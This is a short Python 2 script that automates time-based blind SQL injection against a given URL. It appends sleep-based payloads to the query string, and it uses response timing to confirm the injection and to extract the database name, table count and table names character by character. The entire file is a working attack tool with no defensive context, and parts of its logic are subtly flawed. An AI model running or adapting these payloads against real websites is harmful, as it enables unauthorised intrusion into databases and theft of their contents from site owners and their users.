#!/usr/bin/python


import requests
import string

chars = string.lowercase + string.uppercase + string.digits


class blinder:
    def __init__(self, url, **kwargs):
        if "sleep" in kwargs.keys():
            self.sleep = int(kwargs["sleep"])
        else:
            self.sleep = 2
        self.url = url

    def get_tables(self):
        if not self.check_injection():
            exit(0)
        tables = []
        temp_table_name = ""
        for counter in range(0, self.get_tables_number()+1):
            for tchar in range(10):
                for char in chars:
                    query = ' AND (SELECT IF(ASCII(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema = database() LIMIT %s,1),%s,1)) LIKE ASCII("%s"),sleep(%s),"Null"))' % (counter, tchar, char, self.sleep)
                    final_url = self.url + query
                    req = requests.get(final_url)
                    time = req.elapsed.total_seconds()
                    if time > self.sleep:
                        temp_table_name += char
            if temp_table_name != "":
                tables.append(temp_table_name)
            temp_table_name = ""

        return tables

    def get_tables_number(self):
        for digit in range(20):
            query = ' AND (SELECT IF(substr((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database()),1,1) = %s,sleep(%s),"Null"))' % (digit, self.sleep)
            final_url = self.url + query
            req = requests.get(final_url)
            time = req.elapsed.total_seconds()
            if time > self.sleep:
                return digit

    def check_injection(self):
        test_query = ' AND (SELECT IF(length("a") = 1,sleep(%s),"Null"))' % self.sleep
        url = self.url + test_query
        req = requests.get(url)
        time = req.elapsed.total_seconds()
        if time > self.sleep:
            return True
        else:
            return False

    def get_database(self):
        dbname = ""
        database_length = 0
        for i in range(200):
            lenquery = ' OR (SELECT IF(length(database()) = %s,sleep(%s),"Null"))' % (i, self.sleep)
            final_url = self.url+lenquery
            req = requests.get(final_url)
            time = req.elapsed.total_seconds()
            if time > self.sleep:
                database_length = i
                break
        for position in range(1, database_length+1):
            for char in chars:
                query = ' AND (SELECT IF(substr(database(),%s,1) like "%s",sleep(%s),"Null"))' % (position, char, self.sleep)
                final_url = self.url+query
                req = requests.get(final_url)
                time = req.elapsed.total_seconds()
                if time > self.sleep:
                    dbname += char
                    break
        return dbname
